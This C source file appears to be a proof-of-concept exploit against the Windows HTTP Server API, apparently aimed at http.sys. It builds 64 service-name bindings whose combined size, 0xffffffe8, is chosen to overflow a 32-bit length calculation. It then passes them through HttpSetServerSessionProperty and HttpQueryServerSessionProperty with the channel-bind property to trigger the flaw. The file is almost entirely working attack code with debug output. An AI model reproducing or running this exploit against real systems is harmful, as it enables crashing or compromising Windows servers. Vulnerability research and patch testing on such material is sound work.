#ifndef UNICODE
#define UNICODE
#endif
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <http.h>
#include <stdio.h>
#include <strsafe.h>

#pragma comment(lib, "httpapi.lib")

int
__cdecl
wmain(
    int argc,
    __in_ecount(argc) wchar_t* argv[])
{

    ULONG ReturnLength = 0;
    HTTPAPI_VERSION HttpApiVersion = HTTPAPI_VERSION_2;
    HTTP_CHANNEL_BIND_INFO property;
    PHTTP_SERVICE_BINDING_A ptr[0x40];

    ULONG status = HttpInitialize(
        HttpApiVersion,
        HTTP_INITIALIZE_SERVER,    // Flags
        NULL                       // Reserved
    );

    if (status != NO_ERROR)
    {
        wprintf(L"HttpInitialize(): failed with %lu \n", status);
        return status;
    }

    HTTP_SERVER_SESSION_ID sessionId = HTTP_NULL_ID;
    status = HttpCreateServerSession(HttpApiVersion, &sessionId, 0);
    HANDLE hReqQueue = NULL;
    status = HttpCreateRequestQueue(HttpApiVersion,
        L"MyQueue",
        NULL,
        0,
        &hReqQueue);

    /*
        Compute params
    */
    SIZE_T numberOfServiceNames = 0x40;

    SIZE_T szTotal = 0xffffffe8;
    SIZE_T szServiceNameHeader = 0x20;
    SIZE_T szTotalServiceNameHeaders = szTotal - numberOfServiceNames * szServiceNameHeader;
    SIZE_T szServiceName = szTotalServiceNameHeaders / 0x40;
    szServiceName = (szServiceName + 7) & ~7;
    SIZE_T reminder =  (szServiceName + szServiceNameHeader) * 0x40 - szTotal;

    wprintf(L"[?] szTotal = 0x%llx\n", szTotal);
    wprintf(L"[?] szServiceNameHeader = 0x%llx\n", szServiceNameHeader);
    wprintf(L"[?] szTotalServiceNameHeaders = 0x%llx\n", szTotalServiceNameHeaders);
    wprintf(L"[?] szServiceName = 0x%llx\n", szServiceName);
    wprintf(L"[?] reminder = 0x%llx\n", reminder);

    /*
        Craft buffer
    */
    unsigned char* buf = (unsigned char*)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, szTotal);
    
    for (size_t i = 0; i < numberOfServiceNames; i++) {
        PHTTP_SERVICE_BINDING_A p = (PHTTP_SERVICE_BINDING_A)&buf[i * (szServiceName + szServiceNameHeader)];
        
        p->Base.Type = HttpServiceBindingTypeA;
        p->Buffer = (PCHAR) & buf[i * (szServiceName + szServiceNameHeader) + szServiceNameHeader];
        p->BufferSize = szServiceName;

        ptr[i] = p;

        wprintf(L"[?] sn.buf = 0x%llx\n", p->Buffer);
        wprintf(L"[?] sn.szbuf = 0x%llx\n", p->BufferSize);
        wprintf(L"[?] sn[i] = 0x%llx\n", ptr[i]);
    }
    
    property.Hardening = HttpAuthenticationHardeningStrict;
    property.Flags = HTTP_CHANNEL_BIND_DOTLESS_SERVICE;
    property.NumberOfServiceNames = numberOfServiceNames;
    property.ServiceNames = (PHTTP_SERVICE_BINDING_BASE*)&ptr;

    status = HttpSetServerSessionProperty(sessionId, HttpServerChannelBindProperty, &property, sizeof(HTTP_CHANNEL_BIND_INFO));
    if (status != NOERROR) {
        wprintf(L"HttpSetServerSessionProperty failed with %lu \n", status);
        return -2;
    }

    unsigned char out[0x820];
    status = HttpQueryServerSessionProperty(sessionId, HttpServerChannelBindProperty, &out, sizeof(out), &ReturnLength);
    if (status != NOERROR) {
        wprintf(L"HttpQueryServerSessionProperty failed with %lu \n", status);
        return -3;
    }
}
